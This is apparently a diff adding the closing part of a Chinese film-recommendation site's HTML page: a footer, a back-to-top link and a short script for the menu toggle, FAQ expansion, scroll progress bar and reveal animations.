+      <span>© 2026 琪琪电影网 qiqidianyingwang-app · 本站内容仅作影视信息推荐之用</span>
+      <span>琪琪电影网 · <b>https://qiqidianyingwang-app</b></span>
+    </div>
+  </div>
+</footer>
+
+<a class="totop" id="totop" href="#top" aria-label="返回顶部">↑</a>
+
+<script>
+(function(){
+  var burger = document.getElementById('burger');
+  var menu = document.getElementById('menu');
+  function toggle(){
+    var open = menu.classList.toggle('show');
+    burger.setAttribute('aria-expanded', open ? 'true' : 'false');
+  }
+  burger.addEventListener('click', toggle);
+  burger.addEventListener('keydown', function(e){
+    if(e.key === 'Enter' || e.key === ' '){ e.preventDefault(); toggle(); }
+  });
+  menu.addEventListener('click', function(e){
+    if(e.target.tagName === 'A'){ menu.classList.remove('show'); burger.setAttribute('aria-expanded','false'); }
+  });
+
+  var faq = document.getElementById('faqList');
+  if(faq){
+    faq.addEventListener('click', function(e){
+      var btn = e.target.closest('button');
+      if(!btn){ return; }
+      btn.parentNode.classList.toggle('open');
+    });
+  }
+
+  var bar = document.getElementById('bar');
+  var top = document.getElementById('totop');
+  function onScroll(){
+    var h = document.documentElement.scrollHeight - window.innerHeight;
+    var y = window.pageYOffset || document.documentElement.scrollTop;
+    bar.style.width = (h > 0 ? (y / h * 100) : 0) + '%';
+    if(y > 400){ top.classList.add('show'); } else { top.classList.remove('show'); }
+  }
+  window.addEventListener('scroll', onScroll, {passive:true});
+  onScroll();
+
+  var items = document.querySelectorAll('.reveal');
+  if('IntersectionObserver' in window){
+    var io = new IntersectionObserver(function(entries){
+      entries.forEach(function(en){
+        if(en.isIntersecting){ en.target.classList.add('in'); io.unobserve(en.target); }
+      });
+    }, {threshold:.12});
+    items.forEach(function(el){ io.observe(el); });
+  } else {
+    items.forEach(function(el){ el.classList.add('in'); });
+  }
+})();
+</script>
+</body>
+</html>
